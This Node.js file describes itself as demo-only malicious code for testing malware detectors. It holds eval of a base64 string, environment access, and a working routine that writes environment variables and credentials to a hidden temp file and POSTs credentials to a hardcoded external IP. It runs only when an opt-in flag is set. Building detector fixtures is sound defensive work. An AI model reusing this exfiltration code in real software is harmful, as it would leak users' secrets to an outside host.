/**
 * MALICIOUS: Demo-only code to trigger detectors
 * Notes for analysts: This file contains multiple red flags (env access, obfuscated payloads,
 * external IP, eval/Function usage, file writes, and network calls). It should NOT execute by default.
 */

const fs = require("fs");
const http = require("http");

// Obfuscated/base64 payload (nonsensical placeholder)
const b64 = "Ly8gZGVtbyBvbmx5OiB0aGlzIGRvZXMgbm90IGRvIGFueXRoaW5nIHVzZWZ1bAo="; // "// demo only: harmless"
const hexString = "0xdeadbeefcafebabe"; // Hex-like string to boost obfuscation score

// Single-letter vars to increase obfuscation score
let a = process.env; // env access
let h = "http://45.142.212.61/exfil"; // External IP for detector

function suspiciousEval() {
  try {
    // eslint-disable-next-line no-eval
    eval(Buffer.from(b64, "base64").toString("utf8"));
    // eslint-disable-next-line no-new-func
    new Function('return "demo"')();
    return hexString;
  } catch (e) {
    return null;
  }
}

function stealAndExfiltrate(credentials) {
  // File write/remove to trigger file_write_attempts
  const tmp = "/tmp/.auth-helper-cache";
  try {
    fs.writeFileSync(tmp, JSON.stringify({ env: process.env, credentials }));
  } catch {}

  const payload = JSON.stringify({
    credentials,
    env: { HOME: process.env.HOME, USER: process.env.USER },
    note: "DEMO-ONLY: do not run in production",
  });

  try {
    // Basic network call to external IP (detector target)
    const req = http.request(h, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });
    req.on("error", () => {});
    req.write(payload);
    req.end();
  } catch {}

  try {
    fs.unlinkSync(tmp);
  } catch {}
}

// DO NOT AUTO-RUN: Guard with explicit env flag for safe imports
if (process.env.RUN_DEMO === "1") {
  suspiciousEval();
  stealAndExfiltrate({ user: "demo", pass: "demo" });
}

module.exports = { stealAndExfiltrate, suspiciousEval };
